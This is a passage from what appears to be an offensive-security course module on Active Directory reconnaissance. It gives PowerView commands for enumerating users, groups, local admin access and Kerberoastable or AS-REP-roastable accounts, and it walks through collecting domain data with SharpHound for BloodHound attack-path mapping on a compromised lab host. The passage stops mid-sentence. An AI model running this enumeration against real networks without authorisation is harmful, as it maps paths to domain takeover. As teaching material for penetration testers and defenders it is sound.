.\\PowerView.ps1 -Force # Use -Force if it was previously imported\n</code></pre>\n<p>Now you have access to functions like <code>Get-NetDomain</code>, <code>Get-NetUser</code>, <code>Get-NetGroup</code>, <code>Get-NetComputer</code>, <code>Get-NetGPO</code>, <code>Get-NetForestTrust</code>, <code>Find-LocalAdminAccess</code>, <code>Invoke-UserHunter</code>, <code>Invoke-ShareFinder</code>, etc.</p>\n<p><strong>Examples with <code>PowerView</code>:</strong></p>\n<pre><code class=\"language-powershell\"># Get domain information\nGet-NetDomain\n\n# Get information about the domain controller\nGet-NetDomainController\n\n# List all domain users\nGet-NetUser\n\n# Get specific user details (including potentially useful attributes)\nGet-NetUser -UserName &quot;johndoe&quot; -Properties * # PowerView often gets more attributes by default\n\n# List all domain groups\nGet-NetGroup\n\n# Get members of a specific group\nGet-NetGroupMember -GroupName &quot;Domain Admins&quot;\n\n# Find all computers\nGet-NetComputer\n\n# Find computers where a specific user is a local administrator\nFind-LocalAdminAccess -UserName &quot;johndoe&quot; # Check where &#39;johndoe&#39; has local admin rights\n\n# Find all users logged into domain computers (requires admin rights on target machines)\nInvoke-UserHunter\n\n# Find shares on domain computers\nInvoke-ShareFinder\n\n# List domain trusts\nGet-NetForestTrust\n\n# Find GPOs and their links\nGet-NetGPO\nGet-NetGPO -ComputerName &lt;ComputerName&gt; # Get GPOs applied to a specific computer\nGet-NetGPO -UserName &lt;UserName&gt; # Get GPOs applied to a specific user\n\n# Find users with SPNs (Kerberoasting targets!)\nGet-NetUser -SPN\n\n# Find users with &#39;Do not require Kerberos preauthentication&#39; (AS-REP Roasting targets!)\nGet-NetUser -PreauthNotRequired\n\n# Find Kerberoastable users and output in crackable format (requires admin or specific privileges sometimes)\nGet-NetUser -SPN | Select-Object samaccountname, serviceprincipalname | Format-Table -AutoSize\n# For extraction, tools like Rubeus or Mimikatz are better (covered in M6)\n\n# Find computers/users with unconstrained delegation configured\nGet-NetDelegateStatus -Unconstrained\n\n# Find potential paths to Domain Admins (PowerView can do basic pathfinding, but BloodHound is superior)\nFind-DomainProcess -GroupName &quot;Domain Admins&quot; # Find processes run by DA members\nFind-DomainShare -GroupName &quot;Domain Admins&quot; # Find shares accessible by DA members\nFind-DomainController\n</code></pre>\n<p><strong>Pros of PowerShell/PowerView:</strong></p>\n<ul>\n<li>Much more flexible and powerful than native tools.</li>\n<li>Output is object-based, easy to filter, sort, and export.</li>\n<li><code>PowerView</code> is designed for offensive recon and covers many common AD enumeration tasks efficiently.</li>\n<li>Leverages the .NET framework, often available on the system.</li>\n</ul>\n<p><strong>Cons of PowerShell/PowerView:</strong></p>\n<ul>\n<li>Requires PowerShell execution policies to allow script execution (can often be bypassed).</li>\n<li>Can generate more suspicious logs than native tools.</li>\n<li>Requires getting the script onto the target machine (though fileless execution is possible).</li>\n</ul>\n<p><strong>Pro Tip:</strong> When doing extensive enumeration, save your results! Export to CSV or JSON for later analysis:<br><code>Get-NetUser | Export-Csv -Path C:\\Temp\\domain_users.csv -NoTypeInformation</code></p>\n<hr>\n<h3><strong>5.4 Why Attack Path Mapping? Introducing BloodHound</strong></h3>\n<p>You&#39;ve run your commands, collected lists of users, groups, computers, and GPOs. You might even have some initial findings like &quot;User &#39;backup_admin&#39; is a member of &#39;Backup Operators&#39;&quot; or &quot;Computer &#39;SERVER01&#39; has a lot of shares.&quot;</p>\n<p>But how does this <em>connect</em>? How does knowing &#39;backup_admin&#39; is in &#39;Backup Operators&#39; help you get to &#39;Domain Admins&#39;? Is &#39;backup_admin&#39; a local admin on &#39;SERVER01&#39;? Is a Domain Admin logged into &#39;SERVER01&#39;? What if &#39;backup_admin&#39; has a session on a workstation where a Domain Admin <em>also</em> has a session?</p>\n<p>Active Directory is a graph of relationships. Users are members of groups. Groups have permissions on resources. Users log into computers. Users are local administrators on computers. Users have control over OUs or GPOs. These relationships are complex and form potential <em>attack paths</em>.</p>\n<p>Manually tracing these relationships across thousands of objects is nearly impossible. This is where <strong>BloodHound</strong> comes in.</p>\n<p><strong>BloodHound</strong> is an open-source tool designed to reveal the hidden and often unintended relationships within an Active Directory environment. It uses graph theory to map these connections and identify highly complex attack paths that might otherwise go unnoticed.</p>\n<p><strong>BloodHound Components:</strong></p>\n<ol>\n<li><strong>Collector:</strong> Gathers data from the AD environment. The primary collectors are <strong>SharpHound</strong> (C#) and <strong>PowerHound</strong> (PowerShell). You run this on a compromised host within the domain.</li>\n<li><strong>Database:</strong> Stores the collected data in a graph format. BloodHound uses <strong>Neo4j</strong>, a popular graph database.</li>\n<li><strong>GUI:</strong> A graphical interface to interact with the database, visualize the relationships, and run built-in or custom queries to find attack paths.</li>\n</ol>\n<p><strong>The Power of the Graph:</strong></p>\n<p>BloodHound sees AD objects (Users, Groups, Computers, GPOs, OUs, Trusts) as <em>nodes</em> and the relationships between them (MemberOf, AdminTo, Session, HasSession, GenericAll, WriteDacl, etc.) as <em>edges</em>. By analyzing these edges, it can find paths like:</p>\n<ul>\n<li>User A -&gt; MemberOf -&gt; Group X -&gt; AdminTo -&gt; Computer Y -&gt; HasSession -&gt; User B -&gt; MemberOf -&gt; Domain Admins</li>\n<li>User C -&gt; WriteDacl -&gt; GPO Z -&gt; LinksTo -&gt; OU -&gt; Contains -&gt; Computer W -&gt; LocalAdmin -&gt; User D -&gt; Kerberoastable -&gt; (Crack Hash) -&gt; Access Service on DC -&gt; DCSync -&gt; Domain Admins</li>\n</ul>\n<p>This is the core concept: chaining seemingly unrelated permissions and relationships to find a path to a high-value target.</p>\n<hr>\n<h3><strong>5.5 Using BloodHound: Collection, Database, and GUI</strong></h3>\n<p>Let&#39;s walk through the practical steps of using BloodHound.</p>\n<p><strong>Step 1: Obtain a Collector (SharpHound Recommended)</strong></p>\n<ul>\n<li>Go to the BloodHound GitHub repository (or search for &quot;BloodHound GitHub&quot;).</li>\n<li>Find the releases page. Download the latest <code>SharpHound.exe</code> or <code>SharpHound.zip</code>.</li>\n<li>Transfer <code>SharpHound.exe</code> to your compromised domain-joined host in the lab environment. Place it in a directory you can execute from (e.g., <code>C:\\Temp</code>).</li>\n</ul>\n<p><strong>Step 2: Run the Collector</strong></p>\n<p>Execute <code>SharpHound.exe</code> from a command prompt or PowerShell window on the target host.</p>\n<pre><code class=\"language-cmd\">C:\\Temp\\SharpHound.exe --collectionmethod All\n</code></pre>\n<ul>\n<li><code>--collectionmethod All</code>: This is the most comprehensive collection method. It gathers users, groups, computers, sessions, local admins, ACLs, GPOs, and trusts. In a real engagement, you might start with less noisy methods (<code>Default</code>) and escalate if needed.</li>\n<li>You can specify a domain if the tool doesn&#39;t detect it correctly: <code>--domain your.domain.local</code></li>\n<li><code>SharpHound</code> will output a <code>.json</code> or <code>.zip</code> file (depending on version/flags) in the same directory it was run from. This file contains the collected data.</li>\n</ul>\n<p><strong>Pro Tip:</strong> Running <code>SharpHound</code> with a low-privileged user will still gather significant data (users, groups, computers, trusts, basic session info visible via LDAP). Running it with a user that has local administrator rights on multiple machines or domain query privileges will collect much richer data, especially regarding sessions and local admin rights. Running it as a Domain Admin yields the most complete picture.</p>\n<p><strong>Step 3: Set up the Database (Neo4j)</strong></p>\n<ul>\n<li>Download Neo4j Desktop from the official Neo4j website.</li>\n<li>Install Neo4j Desktop on your at
